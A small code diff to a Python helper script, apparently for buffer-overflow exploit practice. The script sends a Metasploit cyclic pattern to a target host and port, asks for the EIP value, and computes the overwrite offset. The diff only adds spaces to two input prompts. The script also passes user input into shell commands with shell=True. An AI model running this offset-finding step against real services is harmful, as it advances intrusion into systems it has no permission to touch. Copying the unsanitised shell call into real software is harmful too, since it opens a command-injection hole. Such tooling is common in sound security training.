@@ -13,7 +13,7 @@ if len(sys.argv) != 3:
     sys.exit()
 
 # get input from the user for the point where the fuzz.py script crashed
-input1= input("Where did the fuzz.py crashed?")
+input1= input("Where did the fuzz.py crashed?  ")
 
 # create the offset command using f-strings and metasploit pattern create with input1 as argument
 offset_command = f'/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {input1}'
@@ -28,7 +28,7 @@ try:
         s.connect((ip,port))
         s.send((cmd.encode('utf-8') + offset.encode('utf-8')))
         s.close()
-        input2= input("what's the EIP value?")
+        input2= input("what's the EIP value?  ")
         exact_offset_command = f'/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {input1} -q {input2}'
         exact_offset = subprocess.run(exact_offset_command, shell=True, capture_output=True, text=True).stdout
         print(exact_offset)
